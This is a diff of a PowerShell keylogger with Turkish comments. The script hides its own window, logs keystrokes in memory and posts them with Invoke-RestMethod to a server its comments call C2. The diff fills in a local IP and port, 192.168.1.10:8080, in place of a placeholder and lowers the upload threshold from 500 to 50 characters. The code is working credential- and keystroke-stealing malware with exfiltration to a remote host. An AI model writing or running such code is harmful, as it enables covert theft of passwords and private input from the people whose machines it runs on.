@@ -6,7 +6,7 @@ public static extern bool ShowWindow(int hWnd, int nCmdShow);
 $window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
 
 # C2 Sunucu Adresin (Arch makinenin IP'si ve Portu)
-$C2_SERVER = "http://SENIN_ARCH_IP:8000/upload"
+$C2_SERVER = "http://192.168.1.10:8080/upload"
 
 # Logların RAM'de tutulacağı değişken
 $global:KeyLog = ""
@@ -28,7 +28,7 @@ while ($true) {
             $global:KeyLog += $key
             
             # Eğer RAM'deki log 500 karaktere ulaştıysa, C2'ye fırlat ve RAM'i temizle
-            if ($global:KeyLog.Length -ge 500) {
+            if ($global:KeyLog.Length -ge 50) {
                 try {
                     Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $global:KeyLog } -ErrorAction SilentlyContinue
                     $global:KeyLog = "" # Upload başarılıysa hafızayı sıfırla
